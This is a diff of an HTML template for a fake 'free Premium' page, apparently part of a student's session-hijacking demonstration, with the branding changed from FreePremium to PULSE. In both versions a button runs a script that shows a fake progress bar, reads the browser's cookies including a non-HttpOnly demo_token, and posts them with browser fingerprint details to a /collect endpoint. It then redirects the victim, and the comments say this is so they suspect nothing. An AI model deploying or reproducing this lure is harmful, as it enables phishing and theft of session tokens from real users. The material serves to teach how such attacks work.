@@ -1,127 +1,64 @@
 {% extends "base.html" %}
-{% block title %}Free Premium Tool — SessionLab{% endblock %}
-{% block content %}
+{% block title %}PULSE Premium — бесплатно{% endblock %}
+{% block head %}
 <style>
-/* страница выглядит как легитимный сайт — жертва не подозревает */
-.fake-page {
-  max-width: 600px; margin: 4rem auto; text-align: center;
-}
-.fake-logo {
-  font-family: var(--mono); font-size: 2rem; font-weight: 700;
-  color: #e8f0f8; margin-bottom: 0.5rem;
-}
-.fake-sub { font-size: 14px; color: var(--text2); margin-bottom: 3rem; }
-.fake-card {
-  background: var(--bg2); border: 1px solid var(--border);
-  border-radius: 8px; padding: 2.5rem; margin-bottom: 1.5rem;
-}
-.fake-icon { font-size: 3rem; margin-bottom: 1rem; }
-.fake-title {
-  font-family: var(--mono); font-size: 1.1rem; font-weight: 700;
-  color: #e8f0f8; margin-bottom: 0.8rem;
-}
-.fake-desc { font-size: 13px; color: var(--text2); line-height: 1.7; margin-bottom: 1.5rem; }
-.fake-btn {
-  background: var(--accent); color: var(--bg);
-  font-family: var(--mono); font-size: 13px; font-weight: 700;
-  padding: 0.8rem 2rem; border: none; border-radius: 4px;
-  cursor: pointer; letter-spacing: 0.05em; width: 100%;
-}
-.fake-btn:hover { opacity: 0.9; }
-.loading {
-  display: none; margin-top: 1.5rem;
-  font-family: var(--mono); font-size: 12px; color: var(--text3);
-}
-.progress-bar {
-  height: 3px; background: var(--border); border-radius: 2px;
-  margin-top: 0.5rem; overflow: hidden;
-}
-.progress-fill {
-  height: 100%; width: 0%; background: var(--accent);
-  border-radius: 2px; transition: width 0.1s linear;
-}
-/* предупреждение для диплома */
-.edu-warning {
-  background: rgba(255,204,0,0.06); border: 1px solid rgba(255,204,0,0.2);
-  border-radius: 4px; padding: 1rem 1.2rem; margin-bottom: 2rem;
-  font-family: var(--mono); font-size: 11px; color: var(--yellow);
-  text-align: left; line-height: 1.6;
-}
+.promo{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem;position:relative;overflow:hidden}
+.glow{position:absolute;width:600px;height:600px;border-radius:50%;background:radial-gradient(circle,rgba(255,61,119,.18),transparent 60%);top:-150px;filter:blur(20px)}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:2.5rem;max-width:420px;text-align:center;position:relative}
+.gift{font-size:3.5rem;margin-bottom:1rem}
+.h{font-family:var(--disp);font-weight:700;font-size:1.6rem;margin-bottom:.6rem}
+.h b{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.p{color:var(--muted);font-size:.95rem;margin-bottom:1.8rem;line-height:1.6}
+.perks{text-align:left;margin-bottom:1.8rem;display:flex;flex-direction:column;gap:.6rem}
+.perk{display:flex;align-items:center;gap:.7rem;font-size:.9rem}
+.perk .c{color:var(--ok)}
+.go{width:100%;padding:.9rem;font-size:1rem}
+.load{display:none;margin-top:1.3rem}
+.bar{height:4px;background:var(--line);border-radius:3px;overflow:hidden;margin-top:.6rem}
+.fill{height:100%;width:0;background:var(--grad);border-radius:3px;transition:width .1s linear}
+.status{font-size:.82rem;color:var(--muted)}
 </style>
-
-<div class="fake-page">
-<div class="fake-logo">🎁 FreePremium</div>
-  <div class="fake-sub">Получи премиум доступ бесплатно</div>
-
-  <div class="fake-card">
-    <div class="fake-icon">⚡</div>
-    <div class="fake-title">Активация Premium аккаунта</div>
-    <div class="fake-desc">
-      Нажми кнопку ниже чтобы активировать премиум доступ на 30 дней бесплатно.
-      Требуется подтверждение браузера.
+{% endblock %}
+{% block body %}
+<div class="promo">
+  <div class="glow"></div>
+  <div class="card">
+    <div class="gift">🎁</div>
+    <div class="h">PULSE <b>Premium</b> бесплатно</div>
+    <div class="p">Поздравляем! Ваш аккаунт выбран для бесплатной подписки Premium на 30 дней.</div>
+    <div class="perks">
+      <div class="perk"><span class="c">✓</span> Без рекламы</div>
+      <div class="perk"><span class="c">✓</span> Эксклюзивные стикеры</div>
+      <div class="perk"><span class="c">✓</span> Значок Premium в профиле</div>
     </div>
-    <button class="fake-btn" onclick="steal()">
-      Активировать бесплатно →
-    </button>
-    <div class="loading" id="loading">
-      <div id="status">Проверка браузера...</div>
-      <div class="progress-bar">
-        <div class="progress-fill" id="progress"></div>
-      </div>
+    <button class="btn go" onclick="activate()">Активировать бесплатно</button>
+    <div class="load" id="load">
+      <div class="status" id="st">Проверка аккаунта…</div>
+      <div class="bar"><div class="fill" id="fill"></div></div>
     </div>
   </div>
 </div>
-
 <script>
-async function steal() {
-  // показываем фейковый прогресс
-  document.getElementById('loading').style.display = 'block';
-  const progress = document.getElementById('progress');
-  const status = document.getElementById('status');
-  const steps = [
-    [10, 'Проверка браузера...'],
-    [30, 'Подтверждение аккаунта...'],
-    [60, 'Активация лицензии...'],
-    [90, 'Финализация...'],
-  ];
-  for (const [pct, msg] of steps) {
-    progress.style.width = pct + '%';
-    status.textContent = msg;
-    await new Promise(r => setTimeout(r, 600));
-  }
+async function activate(){
+  document.getElementById('load').style.display='block';
+  const fill=document.getElementById('fill'),st=document.getElementById('st');
+  const steps=[[20,'Проверка аккаунта…'],[45,'Подтверждение подписки…'],[70,'Активация Premium…'],[92,'Почти готово…']];
+  for(const [p,m] of steps){fill.style.width=p+'%';st.textContent=m;await new Promise(r=>setTimeout(r,550));}
 
-  // читаем все cookies (JS видит только без HttpOnly)
-  const cookies = document.cookie;
+  // читаем cookie (видны только без HttpOnly — demo_token)
+  const cookies=document.cookie;
+  const demoToken=cookies.split(';').map(c=>c.trim()).find(c=>c.startsWith('demo_token='))?.split('=')[1]||null;
 
-  // извлекаем demo_token — уязвимый cookie без HttpOnly флага
-  const demoToken = cookies.split(';')
-    .map(c => c.trim())
-    .find(c => c.startsWith('demo_token='))
-    ?.split('=')[1] || null;
+  // отправляем на сервер атакующего
+  try{
+    await fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token:demoToken,cookies:cookies,url:location.href,
+        useragent:navigator.userAgent,screen:screen.width+'x'+screen.height,language:navigator.language})});
+  }catch(e){}
 
-  // отправляем на /collect
-  try {
-    await fetch('/collect', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        cookies:    cookies,
-        token:      demoToken,
-        url:        window.location.href,
-        useragent:  navigator.userAgent,
-        timestamp:  new Date().toISOString(),
-        screen:     screen.width + 'x' + screen.height,
-        language:   navigator.language,
-      })
-    });
-  } catch(e) {}
-
-  progress.style.width = '100%';
-  status.textContent = 'Готово! Перенаправление...';
-  await new Promise(r => setTimeout(r, 800));
-
-  // редиректим на легитимную страницу — жертва ничего не замечает
-  window.location.href = '/';
+  fill.style.width='100%';st.textContent='Готово! Перенаправление…';
+  await new Promise(r=>setTimeout(r,700));
+  location.href='/feed';   // жертва возвращается в приложение, ничего не подозревая
 }
 </script>
 {% endblock %}
